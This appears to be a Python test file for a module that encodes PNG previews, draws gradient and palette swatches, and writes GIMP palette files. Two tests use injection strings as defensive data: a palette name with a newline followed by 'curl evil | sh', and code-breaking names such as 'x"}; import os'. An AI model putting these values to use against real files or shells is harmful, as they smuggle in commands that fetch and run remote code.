"""Resources (#52): previews and the GIMP palette format, without GIMP."""

from __future__ import annotations

import io

import gmb_resources  # type: ignore[import-not-found]
from PIL import Image


def test_png_encoder_handles_rgb_and_rgba():
    rgba = bytes([255, 0, 0, 255, 0, 0, 255, 128])
    img = Image.open(io.BytesIO(gmb_resources.encode_png(rgba, 2, 1, 4)))
    assert img.mode == "RGBA" and img.getpixel((1, 0)) == (0, 0, 255, 128)
    img = Image.open(io.BytesIO(gmb_resources.encode_png(bytes([1, 2, 3]), 1, 1, 3)))
    assert img.mode == "RGB" and img.getpixel((0, 0)) == (1, 2, 3)


def test_gradient_strip_repeats_the_samples_on_every_row():
    strip = gmb_resources.gradient_strip([(1.0, 0.0, 0.0, 1.0), (0.0, 0.0, 1.0, 0.5)], height=3)
    img = Image.open(io.BytesIO(strip))
    assert img.size == (2, 3)
    assert img.getpixel((0, 2)) == (255, 0, 0, 255) and img.getpixel((1, 0)) == (0, 0, 255, 128)


def test_palette_swatches_follow_the_columns():
    png = gmb_resources.palette_swatches([(255, 0, 0), (0, 255, 0), (0, 0, 255)], columns=2, cell=4)
    img = Image.open(io.BytesIO(png))
    assert img.size == (8, 8)
    assert img.getpixel((1, 1)) == (255, 0, 0) and img.getpixel((5, 1)) == (0, 255, 0)
    assert img.getpixel((1, 5)) == (0, 0, 255) and img.getpixel((5, 5)) == (255, 255, 255)  # empty cell


def test_gpl_matches_gimps_palette_format():
    text = gmb_resources.write_gpl("Brand", 4, [("Red", (255, 0, 0)), ("", (0, 128, 255))])
    assert text == "GIMP Palette\nName: Brand\nColumns: 4\n#\n255   0   0\tRed\n  0 128 255\tUntitled\n"


def test_a_palette_file_keeps_one_line_per_entry_whatever_the_names():
    # A name carrying a line break must not start a new line: in a file the shell sources, that line runs (#122).
    text = gmb_resources.write_gpl("A\nB", 0, [("x\n; curl evil | sh", (1, 2, 3)), ("t\tab\r", (4, 5, 6))])
    lines = text.splitlines()
    assert lines == ["GIMP Palette", "Name: A B", "Columns: 0", "#", "  1   2   3\tx ; curl evil | sh",
                     "  4   5   6\tt ab "]  # fmt: skip


def test_code_palette_exports_refuse_names_that_would_change_the_code():
    # GIMP's css/python/php/java exports paste entry names into source code without escaping (#122).
    assert gmb_resources.unsafe_palette_name(["Red", "Sky blue 2", "Teinte é"], "python") is None
    for name in ('x"}; import os', "a'b", "a\\b", "a\nb", "a<b", "a`b", "a\x00b"):
        assert gmb_resources.unsafe_palette_name(["Red", name], "python") == name
    assert gmb_resources.unsafe_palette_name(['x"y'], "gpl") is None  # the .gpl writer escapes by itself
